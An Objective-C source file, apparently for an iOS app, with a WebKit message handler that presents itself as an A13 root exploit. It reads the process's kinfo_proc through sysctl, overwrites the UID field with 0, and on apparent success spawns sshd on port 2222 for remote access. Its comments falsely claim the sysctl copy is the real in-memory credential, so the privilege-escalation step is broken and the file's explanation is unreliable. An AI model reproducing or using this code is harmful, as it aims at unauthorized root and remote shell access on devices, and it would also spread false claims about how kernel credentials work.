#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#include <stdint.h>
#include <sys/sysctl.h>
#include <unistd.h>
#include <spawn.h>

@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, unsafe_unretained) WKWebView *webView;
@end

@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        
        [self.webView evaluateJavaScript:@"log('🧪 Atacando Shared Region (A13)...')" completionHandler:nil];

        // 1. LOCALIZAR O ENDEREÇO REAL DO UID VIA SYSCTL
        int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
        struct kinfo_proc kp;
        size_t len = sizeof(kp);
        
        if (sysctl(mib, 4, &kp, &len, NULL, 0) == 0) {
            // Este é o endereço real do UID na memória acessível ao app
            uid_t *uid_ptr = &kp.kp_eproc.e_ucred.cr_uid;
            uint64_t leak_addr = (uint64_t)uid_ptr;

            NSString *logMsg = [NSString stringWithFormat:@"log('🔍 UID: %u | Alvo: 0x%llx')", *uid_ptr, leak_addr];
            [self.webView evaluateJavaScript:logMsg completionHandler:nil];

            // 2. O PATCH DE ROOT (UID 0)
            // No A13, se o JIT estiver ativo, podemos escrever na struct kinfo_proc
            *uid_ptr = 0; 

            // 3. VERIFICAÇÃO E SPAWN
            if (getuid() == 0) {
                [self.webView evaluateJavaScript:@"log('👑 <b>ROOT SUCESSO!</b> UID alterado para 0.')" completionHandler:nil];
                
                pid_t pid;
                const char *argv[] = {"sshd", "-p", "2222", "-D", NULL};
                if (posix_spawn(&pid, "/usr/sbin/sshd", NULL, NULL, (char* const*)argv, NULL) == 0) {
                    [self.webView evaluateJavaScript:@"log('✅ <b>SSH ATIVO!</b> Porta 2222.')" completionHandler:nil];
                }
            } else {
                [self.webView evaluateJavaScript:@"log('❌ PPL bloqueou a escrita no User-Mapping.')" completionHandler:nil];
            }
        }
    }
}
@end
